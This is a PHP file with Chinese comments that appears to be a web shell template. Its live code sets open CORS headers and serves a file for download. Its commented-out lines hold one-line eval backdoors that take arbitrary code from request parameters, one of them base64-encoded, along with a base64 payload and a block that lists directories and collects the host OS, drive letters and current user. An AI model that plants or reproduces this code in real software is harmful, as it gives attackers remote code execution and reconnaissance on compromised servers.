<?php

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Allow-Methods: *');

//@eval($_REQUEST['c']);
header('Content-Length:' .  filesize('file.php'));
header('Content-Disposition:attachment;filename=' . basename('file.php'));
echo @file_get_contents('file.php');

// 获取某目录下所有文件、目录名（不包括子目录下文件、目录名）
//$dir = 'D://code/vue-admin/';
//$handler = opendir($dir);
//while (($filename = readdir($handler)) !== false) {
//    // 务必使用!==，防止目录下出现类似文件名“0”等情况
//    if ($filename !== "." && $filename !== "..") {
//        $files[] = $filename;
//    }
//}
//closedir($handler);
//// 打印所有文件名
//foreach ($files as $value) {
//    echo $value;
//    echo '<br/>';
//}
//echo getcwd();
//$d = dir($dir);
//while (false !== ($entry = $d->read())) {
//    echo $entry."\n";
//    echo '<br/>';
//}
////$d->close();
//@ini_set("display_errors", "0");
//@set_time_limit(0);
//$current_path = dirname($_SERVER["SCRIPT_FILENAME"]);
//if ($current_path == "") $current_path = dirname($_SERVER["PATH_TRANSLATED"]);
//$dir = $current_path . '/';
//$res = ['current_path' => $dir];
//$current_dir = [];
//foreach (scandir($dir) as $value) {
//    $file = $dir . $value;
//    if (!file_exists($file)) {
//        continue;
//    }
//    $f = [];
//    $f['type'] = is_dir($dir . $value);
//    $f['name'] = $value;
//    $f['change_date'] = date("Y/m/d H:i", filemtime($file));
//    if (!is_dir($file)) {
//        $f['file_size'] = filesize($file);
//    } else {
//        $f['file_size'] = 0;
//    }
//    $current_dir[] = $f;
//}
//$res['current_dir'] = $current_dir;
//
//$root_path = '';
//if (substr($current_path, 0, 1) != "/") {
//    foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:";
//} else {
//    $root_path .= "/";
//}
//$res['root_path'] = $root_path;
//$u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
//$s = ($u) ? $u["name"] : @get_current_user();
//$res['pc_name'] = php_uname();
//$res['user'] = $s;
//
//print_r(json_encode($res));

//$dir = getcwd() . '/';$res = [];foreach (scandir($dir) as $value) {$file = $dir . $value;if (!file_exists($file)) {continue;}$f = [];$f['type'] = is_dir($dir . $value);$f['name'] = $value;$f['change_date'] = date("Y/m/d H:i", filemtime($file));    if (!is_dir($file)) {$f['file_size'] = filesize($file);} else {$f['file_size'] = 0;}$res[] = $f;}print_r(json_encode($res));

//

//$s = '$dir = getcwd().\'/\';$res = [];foreach (scandir($dir) as $value) {$file = $dir . $value;if (!file_exists($file)) {continue;}$f = [];$f[\'type\'] = is_dir($dir . $value);$f[\'name\'] = $value;$f[\'change_date\'] = date("Y/m/d H:i", filemtime($file));if (!is_dir($file)) {$f[\'file_size\'] = filesize($file);} else {$f[\'file_size\'] = 0;}$res[] = $f;}print_r(json_encode($res));';

//@eval(@base64_decode($_REQUEST['cc']));&cc=
//eval(base64_decode('JGRpciA9IGdldGN3ZCgpLicvJzskcmVzID0gW107Zm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkdmFsdWUpIHskZmlsZSA9ICRkaXIgLiAkdmFsdWU7aWYgKCFmaWxlX2V4aXN0cygkZmlsZSkpIHtjb250aW51ZTt9JGYgPSBbXTskZlsndHlwZSddID0gaXNfZGlyKCRkaXIgLiAkdmFsdWUpOyRmWyduYW1lJ10gPSAkdmFsdWU7JGZbJ2NoYW5nZV9kYXRlJ10gPSBkYXRlKCJZL20vZCBIOmkiLCBmaWxlbXRpbWUoJGZpbGUpKTtpZiAoIWlzX2RpcigkZmlsZSkpIHskZlsnZmlsZV9zaXplJ10gPSBmaWxlc2l6ZSgkZmlsZSk7fSBlbHNlIHskZlsnZmlsZV9zaXplJ10gPSAwO30kcmVzW10gPSAkZjt9cHJpbnRfcihqc29uX2VuY29kZSgkcmVzKSk7'))
?>